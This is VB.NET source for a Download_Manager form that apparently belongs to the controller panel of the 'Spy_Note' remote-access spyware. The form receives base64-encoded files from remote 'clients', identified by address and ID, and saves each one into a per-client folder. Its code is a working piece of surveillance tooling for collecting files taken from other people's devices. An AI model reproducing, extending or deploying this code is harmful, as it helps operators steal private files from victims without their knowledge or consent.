Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Download_Manager
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Private clos As Integer
    Public Sub New()
        Me.clos = 6
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String, bool As Boolean, namefile As String)
        Dim flag As Boolean = Operators.CompareString(data, Nothing, False) <> 0
        If flag Then
            Dim flag2 As Boolean = Not bool
            If flag2 Then
                Dim separator As String() = New String() {My.Forms.Form1.s.split_Line}
                Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                Dim flag3 As Boolean = Operators.CompareString(array(2).ToString(), "0", False) = 0
                If flag3 Then
                    Me.Label8.Text = "Empty File"
                    Me.Label8.ForeColor = Color.Crimson
                End If
                Me.Label5.Text = array(0)
                Me.Label6.Text = array(1)
                Me.Label7.Text = store_0.FormatFileSize(Conversions.ToLong(array(2)))
            Else
                Try
                    Dim stringBuilder As StringBuilder = New StringBuilder()
                    stringBuilder.AppendFormat("{0}", data)
                    Dim text As String = String.Concat(New String() {Application.StartupPath, "\", store_0.name_folder_app_resource, "\Folder_Clients\", Me.Name_Client, Me.Client_ID, "\Download_Manager"})
                    Dim flag4 As Boolean = Not My.Computer.FileSystem.DirectoryExists(text)
                    If flag4 Then
                        My.Computer.FileSystem.CreateDirectory(text)
                    End If
                    Dim flag5 As Boolean = File.Exists(text + "\" + namefile)
                    If flag5 Then
                        File.Delete(text + "\" + namefile)
                    End If
                    File.WriteAllBytes(text + "\" + namefile, Convert.FromBase64String(stringBuilder.ToString()))
                    Me.Label8.Text = "Complete"
                    Me.Label8.ForeColor = Color.SeaGreen
                    Me.Timer1.Enabled = True
                Catch ex As Exception
                    Me.Label8.Text = "Not Completed"
                    Me.Label8.ForeColor = Color.Crimson
                    Interaction.MsgBox(ex.Message, MsgBoxStyle.Critical, store_0.name_prog)
                End Try
            End If
        End If
    End Sub

    Private Sub Download_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        MyBase.Close()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.clos -= 1
        Dim flag As Boolean = Me.clos < 0
        If flag Then
            MyBase.Close()
        Else
            Me.Button1.Text = "Close(" + Conversions.ToString(Me.clos) + ")"
        End If
    End Sub
End Class